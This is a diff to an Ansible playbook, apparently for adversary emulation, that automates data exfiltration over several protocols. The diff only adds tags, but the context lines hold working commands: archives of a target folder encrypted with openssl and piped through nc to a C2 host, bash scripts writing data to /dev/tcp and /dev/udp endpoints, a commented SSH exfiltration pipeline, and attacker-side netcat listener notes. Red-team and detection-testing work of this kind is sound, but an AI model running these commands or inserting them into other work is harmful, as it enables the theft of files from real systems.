@@ -5,18 +5,22 @@
    - /opt/ansible/vars.yaml
   tasks:
     - name: Ansible check directory exists example.
+      tags: always
       stat:
         path: "{{ exfiltration_folder }}"
       register: exfil_check
     - name: fail if exfil folder does not exist
+      tags: always
       fail: msg="No Exfiltration folder, please run another playbook before this one"
       when: exfil_check.stat.exists == False
     - name: Exfiltration Over Alternative Protocol - SSH
+      tags: SSH
       shell: |
         echo port closed
         #tar czpf - {{ exfiltration_folder }}/* | openssl aes-256-cbc -salt -k {{ password_encryption }} | ssh {{ cnc_fqdn }} 'cat > {{ exfiltration_file }}-ssh.tar.gz.enc'
         # decrypt file on cnc: openssl aes-256-cbc -d -salt -k {{ password_encryption }} -in {{ exfiltration_file }}.tar.gz.enc -out {{ exfiltration_file }}.tar.gz    
     - name: Exfiltration Over Alternative Protocol - SSL/443
+      tags: SSL
       shell: |
         tar czpf - {{ exfiltration_folder }}/* | openssl aes-256-cbc -salt -k {{ password_encryption }} | nc -w1 {{ exfil_fqdn }} {{ cnc_port }}
       # attacker: nc -lp {{ cnc_port }} | openssl aes-256-cbc -d -k $pass {{ password_encryption }} > {{ exfiltration_file }}-ssl.tar.gz.enc
@@ -26,6 +30,7 @@
         dest: "/tmp/{{ exfiltration_file }}.gz"
         format: gz
     - name: Exfiltration Over Alternative Protocol TCP
+      tags: TCP
     # bin/bash required to use /dev/tcp
       shell: |
         echo '#!/bin/bash' > /tmp/exfil-tcp.sh
@@ -34,6 +39,7 @@
         rm /tmp/exfil-tcp.sh
       # attacker: netcat -lvp > {{ exfiltration_file }}-tcp.gz
     - name: Exfiltration Over Alternative Protocol UDP
+      tags: UDP
       shell: |
         echo '#!/bin/bash' > /tmp/exfil-udp.sh
         echo 'cat /tmp/{{ exfiltration_file }}.gz > /dev/udp/{{ exfil_fqdn }}/{{ exfil_port }}' >> /tmp/exfil-udp.sh
@@ -41,6 +47,7 @@
         rm /tmp/exfil-udp.sh
       # attacker: netcat -lvp > {{ exfiltration_file }}-udp.gz
     - name: Exfiltration Over Alternative Protocol - HTTP
+      tags: HTTP
     # required inbound port open
       shell: |
         cd {{ exfiltration_folder }}
